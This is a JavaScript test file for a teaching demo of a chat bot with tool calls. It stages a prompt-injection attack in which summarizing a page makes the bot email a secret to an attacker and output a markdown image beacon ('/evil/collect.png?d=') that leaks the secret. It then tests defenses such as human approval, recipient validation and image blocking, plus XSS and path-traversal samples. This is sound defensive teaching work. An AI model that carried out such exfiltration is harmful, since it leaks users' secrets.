'use strict';
// Run with: npm test   (no dependencies)
const assert = require('assert');
const { execFileSync } = require('child_process');
const path = require('path');
const { createApp } = require('./server');
const { applyChunk } = require('./public/chat-state');
const { renderMarkdown, escapeHtml } = require('./public/render');
const { SECRET } = require('./tools');

const OFF = { approval: false, validateArgs: false, blockExternalImages: false, removeOutboundTool: false };
const flags = { ...OFF };
const { server, attackerLog } = createApp({ delayMs: 0, getFlags: () => flags });
let base;

function setFlags(over) { Object.assign(flags, OFF, over); attackerLog.length = 0; }
const user = (t) => ({ role: 'user', parts: [{ type: 'text', text: t }] });

// Talk to the server like the browser does: POST, read SSE, apply chunks with the real reducer.
async function turn(state, { resume = false } = {}) {
  const res = await fetch(base + '/api/chat', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ messages: state.messages }),
  });
  assert.strictEqual(res.headers.get('content-type'), 'text/event-stream');
  const raw = await res.text();
  const chunks = [];
  for (const evt of raw.split('\n\n')) {
    if (!evt.startsWith('data: ') || evt === 'data: [DONE]') continue;
    const chunk = JSON.parse(evt.slice(6));
    chunks.push(chunk);
    applyChunk(state, chunk, { resume });
  }
  return chunks;
}
const fresh = (text) => ({ messages: [user(text)], status: 'submitted' });
const types = (chunks) => chunks.map((c) => c.type);
const lastAssistant = (s) => s.messages[s.messages.length - 1];
const tool = (s, name) => lastAssistant(s).parts.find((p) => p.type === 'tool' && p.toolName === name);
const fullText = (s) => lastAssistant(s).parts.filter((p) => p.type === 'text').map((p) => p.text).join('');

const tests = [];
const test = (name, fn) => tests.push([name, fn]);

test('streaming: text arrives as many deltas, then finish', async () => {
  setFlags({});
  const s = fresh('hello');
  const chunks = await turn(s);
  assert.strictEqual(chunks[0].type, 'start');
  assert.ok(types(chunks).filter((t) => t === 'text-delta').length > 5, 'expected many small deltas');
  assert.strictEqual(chunks[chunks.length - 1].type, 'finish');
  assert.strictEqual(s.status, 'ready');
  assert.match(fullText(s), /scripted demo bot/);
});

test('tool calling + generative UI: weather goes through every tool state', async () => {
  setFlags({});
  const s = fresh('weather in austin');
  const chunks = await turn(s);
  const t = types(chunks);
  assert.ok(t.indexOf('tool-input-start') < t.indexOf('tool-input-available'));
  assert.ok(t.indexOf('tool-input-available') < t.indexOf('tool-output-available'));
  const p = tool(s, 'showWeather');
  assert.strictEqual(p.state, 'output-available');
  assert.strictEqual(p.output.city, 'Austin');
  assert.strictEqual(typeof p.output.tempF, 'number');
  assert.match(fullText(s), /forecast for Austin/);
});

test('schema validation catches wrong types (what a Zod schema gives you)', () => {
  const { validateSchema, tools } = require('./tools');
  assert.match(validateSchema({ city: 42 }, tools.showWeather.schema), /"city" must be a string/);
  assert.match(validateSchema(null, tools.showWeather.schema), /expected an object/);
  assert.strictEqual(validateSchema({ city: 'x' }, tools.showWeather.schema), null);
});

test('ATTACK (no defenses): email exfiltrates the secret AND the image beacon is in the output', async () => {
  setFlags({});
  const s = fresh('Summarize this page');
  await turn(s);
  assert.strictEqual(tool(s, 'sendEmail').state, 'output-available');
  assert.ok(attackerLog.some((e) => e.kind === 'email' && e.data.includes(SECRET)), 'attacker got the email');
  assert.ok(fullText(s).includes('/evil/collect.png?d='), 'beacon image in output');
  // the browser would now load the image:
  const url = fullText(s).match(/\(([^)]+)\)/)[1];
  const r = await fetch(base + url);
  assert.strictEqual(r.status, 200);
  assert.strictEqual(r.headers.get('content-type'), 'image/png');
  assert.ok(attackerLog.some((e) => e.kind === 'image-beacon' && e.data === SECRET), 'attacker got the beacon');
});

test('DEFENSE approval: stream pauses, nothing is sent until the human approves', async () => {
  setFlags({ approval: true });
  const s = fresh('Summarize this page');
  const chunks = await turn(s);
  assert.ok(types(chunks).includes('tool-approval-request'));
  assert.strictEqual(tool(s, 'sendEmail').state, 'approval-requested');
  assert.strictEqual(attackerLog.filter((e) => e.kind === 'email').length, 0, 'not sent yet');

  const p = tool(s, 'sendEmail');
  p.approved = true; p.state = 'approval-responded';
  await turn(s, { resume: true });
  assert.strictEqual(tool(s, 'sendEmail').state, 'output-available');
  assert.strictEqual(s.messages.length, 2, 'resume continues the same assistant message');
  assert.strictEqual(attackerLog.filter((e) => e.kind === 'email').length, 1, 'sent after approval');
});

test('DEFENSE approval: denying blocks the email', async () => {
  setFlags({ approval: true });
  const s = fresh('Summarize this page');
  await turn(s);
  const p = tool(s, 'sendEmail');
  p.approved = false; p.state = 'approval-responded';
  const chunks = await turn(s, { resume: true });
  assert.ok(types(chunks).includes('tool-output-denied'));
  assert.strictEqual(tool(s, 'sendEmail').state, 'output-denied');
  assert.strictEqual(attackerLog.filter((e) => e.kind === 'email').length, 0);
  assert.match(fullText(s), /blocked/);
});

test('DEFENSE validateArgs: policy rejects the attacker recipient before any approval prompt', async () => {
  setFlags({ validateArgs: true, approval: true });
  const s = fresh('Summarize this page');
  const chunks = await turn(s);
  assert.ok(!types(chunks).includes('tool-approval-request'));
  const p = tool(s, 'sendEmail');
  assert.strictEqual(p.state, 'output-error');
  assert.match(p.errorText, /not allowed/);
  assert.strictEqual(attackerLog.length, 0);
});

test('DEFENSE removeOutboundTool: no email attempt at all (but the beacon is still in the text!)', async () => {
  setFlags({ removeOutboundTool: true });
  const s = fresh('Summarize this page');
  await turn(s);
  assert.strictEqual(tool(s, 'sendEmail'), undefined);
  assert.strictEqual(attackerLog.length, 0);
  assert.ok(fullText(s).includes('/evil/collect.png'), 'one leg removed, other channel remains');
});

test('DEFENSE blockExternalImages: renderer drops the beacon, keeps trusted images', () => {
  const evil = `![status](/evil/collect.png?d=${SECRET})`;
  assert.match(renderMarkdown(evil, { blockExternalImages: false }), /<img [^>]*evil/);
  const blocked = renderMarkdown(evil, { blockExternalImages: true });
  assert.ok(!blocked.includes('<img') && blocked.includes('blocked'));
  assert.match(renderMarkdown('![r](/static/robot.svg)', { blockExternalImages: true }), /<img [^>]*\/static\/robot\.svg/);
});

test('output handling: model text can never inject HTML', () => {
  const html = renderMarkdown('<script>alert(1)</script> <img src=x onerror=alert(1)>');
  assert.ok(!html.includes('<script') && !html.includes('<img'));
  assert.strictEqual(escapeHtml(`"'<>&`), '&quot;&#39;&lt;&gt;&amp;');
  // attribute breakout attempt via image markdown
  const attr = renderMarkdown('![a](/static/x" onerror="alert(1))');
  assert.ok(!attr.includes('" onerror='), 'quotes are escaped, so no attribute breakout');
});

test('ALL defenses on: safe end to end', async () => {
  setFlags({ approval: true, validateArgs: true, blockExternalImages: true, removeOutboundTool: true });
  const s = fresh('Summarize this page');
  await turn(s);
  assert.strictEqual(attackerLog.length, 0);
  assert.ok(!renderMarkdown(fullText(s), { blockExternalImages: true }).includes('<img'));
});

test('client files parse (syntax check)', () => {
  for (const f of ['app.js', 'render.js', 'chat-state.js']) {
    execFileSync(process.execPath, ['--check', path.join(__dirname, 'public', f)]);
  }
});

test('static files + defenses endpoint + bad requests', async () => {
  setFlags({ approval: true });
  const idx = await fetch(base + '/');
  assert.strictEqual(idx.status, 200);
  assert.match(await idx.text(), /Build, Break, Fix/);
  const trav = await fetch(base + '/%2e%2e/server.js');
  assert.notStrictEqual(trav.status, 200, 'no path traversal');
  const d = await (await fetch(base + '/api/defenses')).json();
  assert.strictEqual(d.approval, true);
  const bad = await fetch(base + '/api/chat', { method: 'POST', body: '{nope' });
  assert.strictEqual(bad.status, 400);
});

(async () => {
  await new Promise((r) => server.listen(0, r));
  base = 'http://localhost:' + server.address().port;
  let failed = 0;
  for (const [name, fn] of tests) {
    try { await fn(); console.log('  ✓', name); }
    catch (e) { failed++; console.log('  ✗', name, '\n     ', e.message); }
  }
  server.close();
  console.log(failed ? `\n${failed} FAILED` : `\nall ${tests.length} passed`);
  process.exit(failed ? 1 : 0);
})();
